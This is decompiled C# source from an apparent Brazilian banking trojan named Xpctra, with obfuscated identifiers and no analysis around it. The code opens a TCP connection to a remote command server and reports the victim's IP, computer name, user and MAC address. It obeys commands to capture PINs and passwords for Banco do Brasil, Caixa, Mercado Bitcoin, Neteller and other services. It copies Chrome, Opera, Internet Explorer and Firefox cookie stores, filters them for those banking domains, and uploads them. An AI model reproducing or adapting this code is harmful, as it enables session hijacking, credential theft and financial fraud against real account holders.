// Decompiled with JetBrains decompiler
// Type: Xpctra.ClassConexao
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using VERMELHO265MONARCA.Core.Helper;

namespace Xpctra
{
  internal class ClassConexao
  {
    private INAPROVEITADO608FULIGEM Infospc = new INAPROVEITADO608FULIGEM();
    private Thread[] ATABALHOAR374CRUCIFICACAO = new Thread[1];
    private Thread[] Lendo = new Thread[1];
    private object thisLock = new object();
    private object REINSISTIR951VANDALISMO = new object();
    private object TREINADOR962ACIDENTAL = new object();
    public static TcpClient _client;
    public static NetworkStream TRANSPARECER57ALGEBRICA;
    private StreamReader ANIQUILAR226CONSIDERAR;
    private StreamWriter CONFORMISMO663MINIMA;
    private string NETA801BASQUETEBOLISTICO;
    private int RAPIDAMENTE647TREMELICAR;
    private string infospc;
    private string conexaoDee;
    private const int REMANSO824BOCADELOBO = 1024;

    public static bool Exiting { get; set; }

    public void Conecta(string ip, int _porta, string ConexaoDe)
    {
      while (true)
      {
        this.NETA801BASQUETEBOLISTICO = ip;
        this.RAPIDAMENTE647TREMELICAR = _porta;
        this.conexaoDee = ConexaoDe;
        ClassConexao._client = new TcpClient();
        try
        {
          ClassConexao._client.Connect(ip, _porta);
          ClassConexao.TRANSPARECER57ALGEBRICA = ClassConexao._client.GetStream();
          break;
        }
        catch (Exception ex)
        {
        }
      }
      try
      {
        this.infospc = "ip:" + AMADELEITE205CACADOTES.GeoInfo.Ip + " pcname:" + Xpctra.Properties.Settings.Default.NomePc + " user:" + Xpctra.Properties.Settings.Default.Usuario + " tipo:" + ConexaoDe + " Mac:" + INAPROVEITADO608FULIGEM.MacAdres;
      }
      catch (Exception ex)
      {
        this.infospc = "ip:201.0.0.1 pcname:" + Xpctra.Properties.Settings.Default.NomePc + " user:" + Xpctra.Properties.Settings.Default.Usuario + " tipo:" + ConexaoDe + " Mac:" + INAPROVEITADO608FULIGEM.MacAdres;
      }
      Thread.Sleep(500);
      this.Escreve(ClassConexao._client, this.infospc);
      this.Lendo[0] = new Thread((ThreadStart) (() => this.NADADEIRA90PIEDADE(ClassConexao._client)));
      this.Lendo[0].Start();
      this.ATABALHOAR374CRUCIFICACAO[0] = new Thread(new ThreadStart(this.DIVULGADO250DEFORMAR));
      this.ATABALHOAR374CRUCIFICACAO[0].Start();
    }

    public bool Escreve(TcpClient servidor, string OqEscrever)
    {
      try
      {
        this.CONFORMISMO663MINIMA = new StreamWriter((Stream) servidor.GetStream(), Encoding.ASCII);
        this.CONFORMISMO663MINIMA.WriteLine(OqEscrever);
        this.CONFORMISMO663MINIMA.Flush();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public void NADADEIRA90PIEDADE(TcpClient servidor)
    {
      while (true)
      {
        try
        {
          this.ANIQUILAR226CONSIDERAR = new StreamReader((Stream) ClassConexao._client.GetStream(), Encoding.ASCII);
          while (true)
          {
            switch (this.ANIQUILAR226CONSIDERAR.ReadLine())
            {
              case "Cvv BB":
                APRECO518NECROLOGISTA.PegandoSenhaDebb = true;
                APRECO518NECROLOGISTA.Cvv = true;
                break;
              case "Email Perfect Money":
                VERMELHO265MONARCA.Config.Settings.FormPin = true;
                break;
              case "Encerra Conexao":
                ClassConexao._client.Close();
                if (this.Lendo[0].IsAlive)
                  this.Lendo[0].Abort();
                if (this.ATABALHOAR374CRUCIFICACAO[0].IsAlive)
                {
                  this.ATABALHOAR374CRUCIFICACAO[0].Abort();
                  break;
                }
                break;
              case "Mande Cookie BB":
                new Thread((ThreadStart) (() => this.INALTERABILIDADE92EXPLICATIVO("BB"))).Start();
                break;
              case "Mande Cookie Cef":
                new Thread((ThreadStart) (() => this.INALTERABILIDADE92EXPLICATIVO("Cef"))).Start();
                break;
              case "Mande Cookie Cef 2":
                new Thread(new ThreadStart(this.AIDS841PORNOGRAFIA)).Start();
                break;
              case "Pin MercadoBiticoin":
                VERMELHO265MONARCA.Config.Settings.FormPin = true;
                break;
              case "Prende 24Hrs BB":
                new Thread(new ThreadStart(this.LockBB)).Start();
                break;
              case "Prende 24Hrs Cef":
                new Thread(new ThreadStart(this.LockCef)).Start();
                break;
              case "Senha Blockchain":
                VERMELHO265MONARCA.Config.Settings.FormPin = true;
                break;
              case "Senha De 6 BB":
                APRECO518NECROLOGISTA.PegandoSenhaDebb = true;
                break;
              case "Senha Neteller":
                VERMELHO265MONARCA.Config.Settings.FormPin = true;
                break;
              case "Sessao MercadoBiticoin":
                new Thread((ThreadStart) (() => this.INALTERABILIDADE92EXPLICATIVO("MercadoBiticoin"))).Start();
                break;
            }
          }
        }
        catch (Exception ex)
        {
        }
      }
    }

    private bool MAGNIFICO325MOVEL()
    {
      bool flag = true;
      try
      {
        this.Escreve(ClassConexao._client, "Teste Conexao");
        new StreamReader((Stream) ClassConexao._client.GetStream(), Encoding.ASCII).ReadLine();
      }
      catch
      {
        flag = false;
      }
      return flag;
    }

    private void DIVULGADO250DEFORMAR()
    {
      bool COnexao = true;
      while (true)
      {
        try
        {
          if (ClassConexao.Exiting)
          {
            ClassConexao.Exiting = false;
            ClassSeparabank.ConectadoBB = false;
            ClassSeparabank.ConectadoCef = false;
            ClassSeparabank.quazarcoonectado = false;
            if (this.Lendo[0].IsAlive)
              this.Lendo[0].Abort();
            ClassConexao._client.Close();
            break;
          }
          Thread thread = new Thread((ThreadStart) (() => COnexao = this.MAGNIFICO325MOVEL()));
          thread.Start();
          thread.Join(8000);
          if (thread.IsAlive || !COnexao)
          {
            while (true)
            {
              ClassConexao._client = new TcpClient();
              try
              {
                ClassConexao._client.Connect(this.NETA801BASQUETEBOLISTICO, this.RAPIDAMENTE647TREMELICAR);
                ClassConexao.TRANSPARECER57ALGEBRICA = ClassConexao._client.GetStream();
                Thread.Sleep(2000);
                this.Escreve(ClassConexao._client, this.infospc);
                break;
              }
              catch (Exception ex)
              {
              }
            }
          }
          Thread.Sleep(6000);
        }
        catch (Exception ex)
        {
        }
      }
    }

    private void ERRANTE371MEDO(TcpClient servidor)
    {
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
      Thread.Sleep(100);
      this.Escreve(servidor, "Conexao ok");
    }

    private void INALTERABILIDADE92EXPLICATIVO(string CookieINCORPORACAO654ARRUMAR)
    {
      lock (this.thisLock)
      {
        string str = string.Empty;
        string INCORPORACAO654ARRUMAR = string.Empty;
        if (CookieINCORPORACAO654ARRUMAR.Contains("BB"))
        {
          str = APRECO518NECROLOGISTA.Jsonid;
          INCORPORACAO654ARRUMAR = "bb";
        }
        if (CookieINCORPORACAO654ARRUMAR.Contains("Cef"))
        {
          str = APRECO518NECROLOGISTA.JsonidCef;
          INCORPORACAO654ARRUMAR = "cef";
        }
        if (CookieINCORPORACAO654ARRUMAR.Contains("MercadoBiticoin"))
        {
          str = APRECO518NECROLOGISTA.jsoindMercadoBiticoin;
          INCORPORACAO654ARRUMAR = "MercadoBiticoin";
        }
        if (!(str != string.Empty) || str == null)
          return;
        Match match = Regex.Match(str, "Navegador:(?<Navegador>.*):");
        if (match.Success)
        {
          if (match.Groups["Navegador"].Value.Contains("chrome"))
            this.MOTORA518CILHA(str, INCORPORACAO654ARRUMAR);
          if (match.Groups["Navegador"].Value.Contains("opera"))
            this.ATIRAR523EXPEDIENTE(str, INCORPORACAO654ARRUMAR);
          if (match.Groups["Navegador"].Value.Contains("iexplore"))
            this.EPISCOPAL9BONANCA(str, INCORPORACAO654ARRUMAR);
          if (match.Groups["Navegador"].Value.Contains("firefox"))
            this.ACESO827CORDA(str, INCORPORACAO654ARRUMAR);
        }
      }
    }

    private void MOTORA518CILHA(string jsonid, string INCORPORACAO654ARRUMAR)
    {
      Match match = Regex.Match(jsonid, "(?<Jsonid>.*);");
      if (!match.Success)
        return;
      this.FARSI29ESBRAVEJAR();
      File.Copy(this.RETARDADO115SUSERANO(), Xpctra.Properties.Settings.Default.CaminhoPath + "cookies1.sqlite");
      this.UFANAR458SEMIBREVE(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies1.sqlite", INCORPORACAO654ARRUMAR);
      if (INCORPORACAO654ARRUMAR.Equals("cef"))
        this.Escreve(ClassConexao._client, jsonid);
      if (INCORPORACAO654ARRUMAR.Equals("bb"))
        this.Escreve(ClassConexao._client, "jsonid:" + match.Groups["Jsonid"].Value);
      if (INCORPORACAO654ARRUMAR.Equals("MercadoBiticoin"))
        this.Escreve(ClassConexao._client, jsonid);
      Thread.Sleep(1000);
      this.EnviaArCookie();
    }

    private void ATIRAR523EXPEDIENTE(string jsonid, string INCORPORACAO654ARRUMAR)
    {
      Match match = Regex.Match(jsonid, "(?<Jsonid>.*);");
      if (!match.Success)
        return;
      this.FARSI29ESBRAVEJAR();
      File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies", Xpctra.Properties.Settings.Default.CaminhoPath + "cookies1.sqlite");
      this.UFANAR458SEMIBREVE(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies1.sqlite", INCORPORACAO654ARRUMAR);
      if (INCORPORACAO654ARRUMAR.Equals("cef"))
        this.Escreve(ClassConexao._client, jsonid);
      if (INCORPORACAO654ARRUMAR.Equals("bb"))
        this.Escreve(ClassConexao._client, "jsonid:" + match.Groups["Jsonid"].Value);
      if (INCORPORACAO654ARRUMAR.Equals("MercadoBiticoin"))
        this.Escreve(ClassConexao._client, jsonid);
      Thread.Sleep(1000);
      this.EnviaArCookie();
    }

    private void EPISCOPAL9BONANCA(string jsonid, string INCORPORACAO654ARRUMAR)
    {
      Match match = Regex.Match(jsonid, "(?<Jsonid>.*);");
      if (!match.Success)
        return;
      if (File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite"))
        File.Delete(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite");
      Thread.Sleep(200);
      File.Create(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite").Dispose();
      foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Cookies)))
      {
        string str = File.ReadAllText(file);
        if (INCORPORACAO654ARRUMAR.Contains("bb") && str.Contains("bancobrasil.com.br"))
        {
          using (StreamWriter streamWriter = File.AppendText(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite"))
          {
            streamWriter.WriteLine(str);
            streamWriter.Dispose();
            streamWriter.Close();
          }
        }
        if (INCORPORACAO654ARRUMAR.Contains("MercadoBiticoin") && str.Contains("mercadobitcoin.com.br"))
        {
          using (StreamWriter streamWriter = File.AppendText(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite"))
          {
            streamWriter.WriteLine(str);
            streamWriter.Dispose();
            streamWriter.Close();
          }
        }
        if (INCORPORACAO654ARRUMAR.Contains("cef") && str.Contains("caixa.gov.br"))
        {
          using (StreamWriter streamWriter = File.AppendText(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite"))
          {
            streamWriter.WriteLine(str);
            streamWriter.Dispose();
            streamWriter.Close();
          }
        }
      }
      if (INCORPORACAO654ARRUMAR.Equals("cef"))
        this.Escreve(ClassConexao._client, jsonid);
      if (INCORPORACAO654ARRUMAR.Equals("bb"))
        this.Escreve(ClassConexao._client, "jsonid:" + match.Groups["Jsonid"].Value);
      if (INCORPORACAO654ARRUMAR.Equals("MercadoBiticoin"))
        this.Escreve(ClassConexao._client, jsonid);
      Thread.Sleep(1000);
      this.EnviaArCookie();
    }

    private void ACESO827CORDA(string jsonid, string INCORPORACAO654ARRUMAR)
    {
      Match match1 = Regex.Match(jsonid, "(?<Jsonid>.*);");
      if (!match1.Success)
        return;
      this.FARSI29ESBRAVEJAR();
      Match match2 = Regex.Match(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\profiles.ini"), "Path=Profiles\\S(?<CaminhoProfile>.*)\\s");
      if (match2.Success && Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\" + match2.Groups["CaminhoProfile"].Value))
      {
        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\" + match2.Groups["CaminhoProfile"].Value.Replace("\r", "") + "\\cookies.sqlite", Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite");
        if (INCORPORACAO654ARRUMAR.Equals("cef"))
          this.Escreve(ClassConexao._client, jsonid);
        if (INCORPORACAO654ARRUMAR.Equals("bb"))
          this.Escreve(ClassConexao._client, "jsonid:" + match1.Groups["Jsonid"].Value);
        if (INCORPORACAO654ARRUMAR.Equals("MercadoBiticoin"))
          this.Escreve(ClassConexao._client, jsonid);
        Thread.Sleep(1000);
        this.EnviaArCookie();
      }
    }

    private void EnviaArCookie()
    {
      NetworkStream networkStream = (NetworkStream) null;
      try
      {
        networkStream = ClassConexao._client.GetStream();
        FileStream fileStream = new FileStream(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite", FileMode.Open, FileAccess.Read);
        int int32 = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(fileStream.Length) / Convert.ToDouble(1024)));
        int length = (int) fileStream.Length;
        for (int index = 0; index < int32; ++index)
        {
          int count;
          if (length > 1024)
          {
            count = 1024;
            length -= count;
          }
          else
            count = length;
          byte[] buffer = new byte[count];
          fileStream.Read(buffer, 0, count);
          networkStream.Write(buffer, 0, buffer.Length);
        }
        fileStream.Close();
      }
      catch (Exception ex)
      {
      }
      finally
      {
        try
        {
          networkStream.Close();
        }
        catch
        {
        }
      }
    }

    public bool Desconectar()
    {
      ClassConexao._client.Close();
      return true;
    }

    private void LockBB()
    {
      lock (this.REINSISTIR951VANDALISMO)
      {
        APRECO518NECROLOGISTA.LockBB = true;
        if (File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "LockBB.txt"))
        {
          File.Delete(Xpctra.Properties.Settings.Default.CaminhoPath + "LockBB.txt");
          File.Create(Xpctra.Properties.Settings.Default.CaminhoPath + "LockBB.txt").Dispose();
        }
        else
          File.Create(Xpctra.Properties.Settings.Default.CaminhoPath + "LockBB.txt").Dispose();
        StreamWriter streamWriter = new StreamWriter(Xpctra.Properties.Settings.Default.CaminhoPath + "LockBB.txt");
        int day = DateTime.Now.Day;
        int month = DateTime.Now.Month;
        int hour = DateTime.Now.Hour;
        streamWriter.Write("Dia:" + (object) day + Environment.NewLine + "Mes:" + (object) month + Environment.NewLine + "Hora:" + (object) hour);
        streamWriter.Dispose();
        streamWriter.Close();
      }
    }

    private void LockCef()
    {
      lock (this.TREINADOR962ACIDENTAL)
      {
        APRECO518NECROLOGISTA.LockCef = true;
        if (File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "LockCef.txt"))
        {
          File.Delete(Xpctra.Properties.Settings.Default.CaminhoPath + "LockCef.txt");
          File.Create(Xpctra.Properties.Settings.Default.CaminhoPath + "LockCef.txt").Dispose();
        }
        else
          File.Create(Xpctra.Properties.Settings.Default.CaminhoPath + "LockCef.txt").Dispose();
        StreamWriter streamWriter = new StreamWriter(Xpctra.Properties.Settings.Default.CaminhoPath + "LockCef.txt");
        int day = DateTime.Now.Day;
        int month = DateTime.Now.Month;
        int hour = DateTime.Now.Hour;
        streamWriter.Write("Dia:" + (object) day + Environment.NewLine + "Mes:" + (object) month + Environment.NewLine + "Hora:" + (object) hour);
        streamWriter.Dispose();
        streamWriter.Close();
      }
    }

    private void UFANAR458SEMIBREVE(string caminho, string Cookiedobanco)
    {
      string str1 = string.Empty;
      StreamReader streamReader = new StreamReader(caminho);
      string str2;
      while ((str2 = streamReader.ReadLine()) != null)
      {
        if (Cookiedobanco.Contains("bb") && str2.Contains("bancobrasil.com.br"))
          str1 = str2 + Environment.NewLine + str1;
        if (Cookiedobanco.Contains("cef") && str2.Contains("caixa.gov"))
          str1 = str2 + Environment.NewLine + str1;
        if (Cookiedobanco.Contains("MercadoBiticoin") && str2.Contains("mercadobitcoin.com.br"))
          str1 = str2 + Environment.NewLine + str1;
      }
      streamReader.Dispose();
      streamReader.Close();
      if (!File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite"))
        File.Create(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite").Dispose();
      StreamWriter streamWriter = new StreamWriter(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite");
      streamWriter.Write(str1);
      streamWriter.Dispose();
      streamWriter.Close();
    }

    private void FARSI29ESBRAVEJAR()
    {
      try
      {
        if (File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies1.sqlite"))
          File.Delete(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies1.sqlite");
        if (!File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite"))
          return;
        File.Delete(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite");
      }
      catch (Exception ex)
      {
      }
    }

    private void AIDS841PORNOGRAFIA()
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter(Xpctra.Properties.Settings.Default.CaminhoPath + "cookies.sqlite");
        streamWriter.Write(APRECO518NECROLOGISTA.CookieCeff);
        streamWriter.Dispose();
        streamWriter.Close();
        this.Escreve(ClassConexao._client, APRECO518NECROLOGISTA.JsonidCef);
        Thread.Sleep(1000);
        this.EnviaArCookie();
      }
      catch (Exception ex)
      {
      }
    }

    private string RETARDADO115SUSERANO()
    {
      int hour = DateTime.Now.Hour;
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\").GetFiles("Cookies", SearchOption.AllDirectories))
      {
        if (file.Name.Contains("Cookies") && file.LastWriteTime.Hour == hour)
          return file.FullName;
      }
      return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies";
    }
  }
}
